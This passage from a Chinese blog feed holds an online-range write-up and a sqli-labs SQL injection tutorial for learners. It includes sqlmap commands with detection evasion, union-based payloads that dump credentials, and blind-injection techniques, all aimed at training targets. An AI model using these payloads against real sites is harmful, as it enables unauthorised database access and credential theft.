src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20211125143619069.png" alt="image-20211125143619069"></p><p>3.emmmmm，服务器好像崩掉了。。。。换个题</p><h1 id="靶场二——SQL手工注入漏洞测试（MsSQL数据库-字符型）"><a href="#靶场二——SQL手工注入漏洞测试（MsSQL数据库-字符型）" class="headerlink" title="靶场二——SQL手工注入漏洞测试（MsSQL数据库-字符型）"></a>靶场二——SQL手工注入漏洞测试（MsSQL数据库-字符型）</h1><p>同上进到这个页面</p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image6.png" alt="image6"></p><p>利用sqlmap工具</p><p>输入命令</p><p><code>sqlmap -u http://219.153.49.228:45309/new_list.php?id=tingjigonggao --current-db</code></p><p>一直提示连接无法建立</p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image7.png" alt="image7"></p><p>命令后面加上<code>-user-agent选项</code>，这里加上–random-agent，不然会被检测出来使用了sqlmap工具从而被拦截。</p><p>输入命令</p><p><code>sqlmap -u http://219.153.49.228:45309/new_list.php?id=tingjigonggao --current-db -random-agent</code></p><p>得到当前数据库名称为<strong>mozhe_discuz_stormgroup</strong></p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image8.png" alt="image8"></p><p>知道数据库名称后再来查看表单名称，输入命令</p><p><code>sqlmap -u http://219.153.49.228:45309/new_list.php?id=tingjigonggao -D mozhe_discuz_stormgroup --tables -random-agent</code></p><p>知道两个表单名为<strong>notice</strong>和<strong>stormgroup_member</strong></p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image9.png" alt="image9"></p><p>再来依次查看两个表单的数据，输入命令</p><p><code>sqlmap -u http://219.153.49.228:45309/new_list.php?id=tingjigonggao -D mozhe_discuz_stormgroup -T notice --columns dump -random-agent</code></p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image10.png" alt="image10"></p><p><code>sqlmap -u http://219.153.49.228:45309/new_list.php?id=tingjigonggao -D mozhe_discuz_stormgroup -T stormgroup_member --columns dump -random-agent</code></p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image11.png" alt="image11"></p><p>我们看到stormgroup_member表里面有name和password列，于是开始查stormgroup表里面列name和列password的数据</p><p><code>sqlmap -u http://219.153.49.228:45309/new_list.php?id=tingjigonggao -D mozhe_discuz_stormgroup -T stormgroup_member -C name,password --dump -random-agent</code></p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image12.png" alt="image12"></p><p>对这两个密码用cmd5解密，发现第二个账号可以登录，拿到了KEY!</p><p>同样的对第一个靶场也能用sqlmap解决。</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 墨者，网络安全，sql注入，在线靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs——sql注入学习(一)</title>
      <link href="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SQLI和sqli-labs介绍"><a href="#一、SQLI和sqli-labs介绍" class="headerlink" title="一、SQLI和sqli-labs介绍"></a>一、SQLI和sqli-labs介绍</h1><p>SQLI，sql injection，我们称之为sql注入。何为sql，英文：StructuredQueryLanguage，<br>叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL,Oracle以及Postgresql。Sql<br>语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数<br>据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的<br>时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql<br>注入。</p><p>对SQLI的学习旨在对sql注入原理的了解，在了解原理后可以使用一些自动化软件如sqlmap。</p><p>同时本次学习推荐使用带Hackbar插件的火狐浏览器。</p><p>sqlilabs项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h1 id="二、Sqli-labs安装"><a href="#二、Sqli-labs安装" class="headerlink" title="二、Sqli-labs安装"></a>二、Sqli-labs安装</h1><p>本人安装环境如下：</p><p>apache+mysql+php</p><p>利用phpstudy一键化搭建，将下载的sqlilabs源码直接放进www目录中</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image1.png" alt="image1"></p><p>然后再配置一下db-cred.inc里面的用户密码，最后访问界面并初始化即可。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image2.png" alt="image2"></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image3.png" alt="image3"></p><h1 id="三、基础知识"><a href="#三、基础知识" class="headerlink" title="三、基础知识"></a>三、基础知识</h1><h2 id="1-注入的分类"><a href="#1-注入的分类" class="headerlink" title="1.注入的分类"></a>1.注入的分类</h2><h3 id="1-基于从服务器接收到的响应"><a href="#1-基于从服务器接收到的响应" class="headerlink" title="(1).基于从服务器接收到的响应"></a>(1).基于从服务器接收到的响应</h3><ul><li>基于错误的SQL注入</li><li>联合查询的类型</li><li>堆查询注射</li><li>SQL盲注<br>•基于布尔SQL盲注</li></ul><p>​       •基于时间的SQL盲注<br>​       •基于报错的SQL盲注</p><h3 id="2-基于如何处理输入的SQL询数类）查询（数据类型）"><a href="#2-基于如何处理输入的SQL询数类）查询（数据类型）" class="headerlink" title="(2).基于如何处理输入的SQL询数类）查询（数据类型）"></a>(2).基于如何处理输入的SQL询数类）查询（数据类型）</h3><ul><li>基于字符串</li><li>数字或整数为基础的</li></ul><h3 id="3-基于程度和顺序的注入-哪里发生了影响"><a href="#3-基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="(3).基于程度和顺序的注入(哪里发生了影响)"></a>(3).基于程度和顺序的注入(哪里发生了影响)</h3><ul><li>一阶注射</li><li>二阶注射</li></ul><p>一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存<br>储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间<br>接的对WEB产生危害，这样的就被称为是二阶注入。</p><h3 id="4-基于注入点的位置上的"><a href="#4-基于注入点的位置上的" class="headerlink" title="(4).基于注入点的位置上的"></a>(4).基于注入点的位置上的</h3><ul><li>通过用户输入的表单域的注射。</li><li>通过cookie注射。</li><li>通过服务器变量注射。（基于头部信息的注射）</li></ul><h2 id="2-系统函数"><a href="#2-系统函数" class="headerlink" title="2.系统函数"></a>2.系统函数</h2><h3 id="介绍几个常用的函数："><a href="#介绍几个常用的函数：" class="headerlink" title="介绍几个常用的函数："></a>介绍几个常用的函数：</h3><p>1.version()——MySQL版本<br>2.user()——数据库用户名<br>3.database()——数据库名<br>4.@@datadir——数据库路径<br>5.@@version_compile_os——操作系统版本</p><h2 id="3-字符串连接函数"><a href="#3-字符串连接函数" class="headerlink" title="3.字符串连接函数"></a>3.字符串连接函数</h2><p>函数的具体介绍可移步<a href="http://www.cnblogs.com/lcamry/p/5715634.html">http://www.cnblogs.com/lcamry/p/5715634.html</a></p><p>1.concat(str1,str2,…)——没有分隔符地连接字符串<br>2.concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串<br>3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p><p>这三个函数无需过深的了解，只需要知道这三个函数可以一次性查出所有的信息即可。</p><h2 id="4-一般用于尝试的语句"><a href="#4-一般用于尝试的语句" class="headerlink" title="4.一般用于尝试的语句"></a>4.一般用于尝试的语句</h2><p><strong>注：–+可以用#替换，url提交过程中Url编码后的#为%23</strong></p><p><code>or 1=1--+</code><br><code>&#39;or 1=1--+</code><br><code>&quot;or 1=1--+</code><br><code>) or 1=1--+</code><br><code>&#39;) or 1=1--+</code><br><code>&quot;) or 1=1--+</code><br><code>&quot;)) or 1=1--+</code><br>一般的代码为：</p><p>$id=$_GET[‘id’];</p><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p>此处考虑两个点，一个是闭合前面你的‘另一个是处理后面的‘，一般采用两种思<br>路，闭合后面的引号或者注释掉，注释掉采用–+或者#（%23）</p><h2 id="5-union操作符的介绍"><a href="#5-union操作符的介绍" class="headerlink" title="5.union操作符的介绍"></a>5.union操作符的介绍</h2><p>UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的<br>列的顺序必须相同。</p><p><strong>SQL UNION语法</strong></p><p><code>SELECT column_name(s) FROM table_name1</code><br><code>UNION</code><br><code>SELECT column_name(s) FROM table_name2</code></p><p><strong>SQL UNION ALL语法</strong></p><p><code>SELECT column_name(s) FROM table_name1</code><br><code>UNIONALL</code><br><code>SELECT column_name(s) FROM table_name2</code></p><p>另外，UNION结果集中的列名总是等于UNION中第一个SELECT语句中的列名。</p><h2 id="6-sql中的逻辑运算"><a href="#6-sql中的逻辑运算" class="headerlink" title="6.sql中的逻辑运算"></a>6.sql中的逻辑运算</h2><p>理解万能密码语句</p><p><code>Select * from admin where username=’admin’ and password =’ ’ or 1=1#</code>’</p><p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin用户了。</p><p>原 因 是 在where子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句<strong>username=’admin’</strong> <strong>and</strong><br><strong>password=’ ’</strong> <strong>or 1=1#‘</strong>。三个条件用and和or进行连接。在sql中，我们and的运算优先<br>级大于or的元算优先级。因此可以看到第一个条件（用a表示）是真的，第二个条件（用<br>b表示）是假的，aandb=false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件or运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语<br>句就是恒真了。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image4.png" alt="image4"></p><p>再理解下面三条语句：</p><ol><li>Select * from users where id=1 and 1=1;</li><li>Select * from users where id=1 &amp;&amp; 1=1;</li><li>Select * from users where id=1 &amp; 1=1;</li></ol><p>上面三条语句有什么区别？</p><p>1和2的意思是一样的，表达的意思是id=1条件和1=1条件进行与运算。</p><p>3的意思是id=1与1进行&amp;位运算，id=1被当作true，与1进行&amp;运算结果还是1，再进行=操作，1=1，还是1。（注：&amp;的优先级大于=）</p><p>注：此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要<br>的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii码值。再从<br>ascii值反推回字符。（运用较少）</p><h2 id="7-注入流程"><a href="#7-注入流程" class="headerlink" title="7.注入流程"></a>7.注入流程</h2><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image5.png" alt="image5"></p><p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有<br>很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数<br>据库名下的数据表，再获取当前数据表下的列，最后获取数据。<br>现在做一些mysql的基本操作。启动mysql，然后通过查询检查下数据库:</p><p><code>show databases;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image6.png" alt="image6"></p><p>这个实验用到的数据库名为security,所以我们选择security来执行命令。</p><p><code>use security;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image7.png" alt="image7"></p><p>我们可以查看下这个数据库中有哪些表</p><p><code>show tables;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image8.png" alt="image8"></p><p>现在我们可以看到这里有四张表，然后我们来看下这张表的结构。</p><p><code>desc emails;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image9.png" alt="image9"></p><p>在继续进行前台攻击时，我们想讨论下系统数据库，即information_schema。所以我们使<br>用它</p><p><code>use information_schema</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image10.png" alt="image10"></p><p>让我们来看下表格。</p><p><code>show tables;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image11.png" alt="image11"></p><p>现在我们先来枚举这张表</p><p><code>desc tables;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image12.png" alt="image12"></p><p>现在我们来使用这个查询：</p><p><code>select table_name from information_schema.tables where table_schema = &quot;security&quot;;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image13.png" alt="image13"></p><p>使用这个查询，我们可以下载到表名</p><p>Mysql有一个系统数据库information_schema(<strong>注：mysql 5.0以后才有</strong>)，存储着所有的数据库的相关信息，一般的，<br>我们利用该表可以进行一次完整的注入。以下为一般的流程</p><p>猜数据库</p><p><code>select schema_name from information_schema.schemata;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image14.png" alt="image14"></p><p>猜某库的数据表</p><p><code>select table_name from information_schema.tables where table_schema=&quot;XXXXXX&quot;</code></p><p>猜某表的所有列</p><p><code>select column_name from information_schema.columns where table_name=&quot;xxxxxx&quot;</code></p><p>获取某列的内容</p><p><code>select *** from xxxxxx</code></p><h1 id="四-Sqlilabs关卡学习"><a href="#四-Sqlilabs关卡学习" class="headerlink" title="四.Sqlilabs关卡学习"></a>四.Sqlilabs关卡学习</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>直接在192.168.176.133/sqli-labs-master/Less-1/?id=1后面加任意字符，看返回值，发现还是正常显示</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image15.png" alt="image15"></p><p>查看第一关源码</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image16.png" alt="image16"></p><p>在?id=1后面加’ and 1=2 –+，显示不正常，说明有注入点</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image17.png" alt="image17"></p><p>此处可以利用orderby。Orderby对前面的数据进行排序，这里有三列数据，我们就只能用<br>orderby3,超过3就会报错。</p><p>‘order by 4–+的结果就会报错</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image18.png" alt="image18"></p><p>我们接着使用union联合注入</p><p><a href="http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39;">http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,3–+</p><p>前面的?id=-1是为了将原先的显示down掉，由于知道了有三列数据，于是我们这里让这三列数据显示出各自的位置</p><p>我们可以看到2和3的显示位置</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image19.png" alt="image19"></p><p>我们将2换为database()，3换为user()，就可以查到当前数据名称和当前用户名称了</p><p><a href="http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39;">http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,database(),user()–+</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image20.png" alt="image20"></p><p>比如，爆数据库</p><p><code>http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image21.png" alt="image21"></p><p>爆security数据库的数据表</p><p><code>http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image22.png" alt="image22"></p><p>爆users表的列</p><p><code>http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image23.png" alt="image23"></p><p>爆数据</p><p><code>http://192.168.176.133/sqli-labs-master/Less-1/?id=-1&#39; union select 1,username,password from users where id=2--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image24.png" alt="image24"></p><p><strong>补充：这样的union操作在Less1-Less4都可以进行。</strong></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>进入第二关，在?id=1后乱输入asd，网页显示不正常</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image25.png" alt="image25"></p><p>说明有注入点，查看源码也可知道这里是一个数字型注入</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image26.png" alt="image26"></p><p>通过order by我们知道有三列数据</p><p>我们就可以直接在后面加上union联合查询</p><p><code>http://192.168.176.133/sqli-labs-master/Less-2/?id=-1 union select 1,database(),user()</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image27.png" alt="image27"></p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>随便在?id=1后面输入，但显示正常</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image28.png" alt="image28"></p><p>输入’来试试，显示错误</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image29.png" alt="image29"></p><p>说明开发者的查询是带括号的引号，即类似这样的</p><p><code>Select login_name,select password from table where id=(‘our input here’)</code></p><p>于是我们在后面加上’)–+，显示正常</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image30.png" alt="image30"></p><p>于是我们的注入语句如下：</p><p><a href="http://192.168.176.133/sqli-labs-master/Less-3/?id=-1&#39;">http://192.168.176.133/sqli-labs-master/Less-3/?id=-1&#39;</a>) union select 1,database(),user() –+</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image31.png" alt="image31"></p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>在?id=1后面加上’ 或’)都不行，试试看”和”)，发现”)成功！</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image32.png" alt="image32"></p><p>注入语句如下:</p><p><code>http://192.168.176.133/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,database(),user()--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image33.png" alt="image33"></p><h2 id="补充：盲注"><a href="#补充：盲注" class="headerlink" title="补充：盲注"></a>补充：盲注</h2><p>何为盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。从<br>前面的基础知识中，我们可以知道盲注分为三类</p><ul><li>基于布尔SQL盲注</li><li>基于时间的SQL盲注</li><li>基于报错的SQL盲注</li></ul><h3 id="1-基于布尔SQL盲注——构造逻辑判断"><a href="#1-基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="(1).基于布尔SQL盲注——构造逻辑判断"></a>(1).基于布尔SQL盲注——构造逻辑判断</h3><p>我们可以利用逻辑判断进行截取字符串相关函数解析</p><p>参考<a href="http://www.cnblogs.com/lcamry/p/5504374.html">http://www.cnblogs.com/lcamry/p/5504374.html</a></p><ul><li><p><strong>left(character,integar)</strong></p><p>解释：character表示要截取的字符串，integar表示截取字符个数，left(a,b)表示从左侧截取a的前b位</p></li><li><p><strong>substr(string,start,length)</strong></p><p>解释： Substr()和substring()函数实现的功能是一样的，均为截取字符串。第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p></li><li><p><strong>ascii(character)</strong></p></li></ul><p>解释：将某<strong>个</strong>字符转换位ascii值</p><ul><li><strong>ord()</strong></li></ul><p>解释：同ascii()函数</p><ul><li><p><strong>mid(string,start,length)</strong></p><p>解释：参数描述同substr()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>mid()函数还有其他扩展用法，具体可移步<a href="https://blog.csdn.net/weixin_35009537/article/details/113968046?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">https://blog.csdn.net/weixin_35009537/article/details/113968046?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link</a></p></li></ul><p>解释：mid(a,b,c)从位置b开始，截取a字符的第c位；ord函数同ascii一样，将字符转为ascii值</p><p><strong>使用案例：</strong></p><p><code>select &#39;Hello World!&#39;,left(&#39;Hello World!&#39;,5) as &#39;左边5个字符&#39;</code>;</p><p>意为创建一列名为<strong>Hello World!<strong>并放入数据</strong>Hello world!<strong>，然后再创建一列名为</strong>左边5个字符</strong>并放入数据数据<strong>Hello world!<strong>的前5个字符</strong>Hello</strong>。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image34.png" alt="image34"></p><p>类似的用法还有很多：</p><p><code>SELECT MID(&#39;I drink coffee&#39;,3,5) Result;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image35.png" alt="image35"></p><p><code>select ascii(substr((select username from users where id=2),1,1)</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image36.png" alt="image36"></p><ul><li><strong>regexp正则注入</strong></li></ul><p>正则注入参考：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p><p><strong>举例1：</strong></p><p>经过查询，当前用户为root</p><p><code>select user();</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image37.png" alt="image37"></p><p>利用regexp来进行过滤</p><p><code>select user() regexp &#39;^ro&#39;；</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image38.png" alt="image38"></p><p><strong>举例2：</strong></p><p>users表中有如下数据：</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image39.png" alt="image39"></p><p>查询username中开头字符是ad的：</p><p><code>select * from users where username regexp &#39;^ad&#39;;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image40.png" alt="image40"></p><p><strong>举例3：</strong></p><p><code>select * from users where id=1 and 1=(if((user() regexp &#39;^r&#39;),1,0));</code></p><p>同</p><p><code>select * from users where id=1 and 1=(user() regexp &#39;^ri&#39;);</code></p><p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等<br>于0或者1进行判断。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image41.png" alt="image41"></p><p><strong>举例4：</strong></p><p><code>select * from users where id=1 and 1=(select 1 from information_schema.tables</code><br><code>where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1);</code></p><p>这里是security库中表名开头带us的表的列为users的所有数据，前面加上id=1表示只取第一行数据。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image42.png" alt="image42"></p><ul><li><strong>like匹配注入</strong></li></ul><p>和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。</p><p>用法：</p><p><code>select user() like &#39;ro%&#39;;</code></p><p><code>select user() like &#39;r1%&#39;;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image43.png" alt="image43"></p><p><strong>注：在mysql中，*代表全部的意思；%表示通配任意N个字符；_表示统配任意单个字符。</strong></p><h3 id="2-基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#2-基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="(2).基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>(2).基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h3><p><strong>1.floor()报错：</strong></p><p>报错显示user为root@localhost</p><p><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></p><p>也可以简写成</p><p><code>select count(*) from information_schema.columns group by concat(user(), floor(rand(0)*2));</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image44.png" alt="image44"></p><p><strong>mysql</strong>中</p><p>**count():**返回匹配指定条件的行数</p><p><strong>rand()：</strong>用于产生一个0**(包含)<strong>~1</strong>(不包含)**的随机数。如果函数形式是rand()，那么就会随机产生0-1的随机数；但如果给定种子值，比如rand(1)，那么产生的0-1的随机数就是固定的。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image45.png" alt="image45"></p><p><strong>floor()：</strong>向下取整。比如对rand()使用floor()，由于rand()产生的是0-1的随机数，那么得到的值永远是0；但后面如果乘上2，那就是0或者1。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image46.png" alt="image46"></p><p>于是我们执行</p><p><code>select floor(rand(0)*2) from information_schema.schemata;</code></p><p>和</p><p><code>select count(*) from 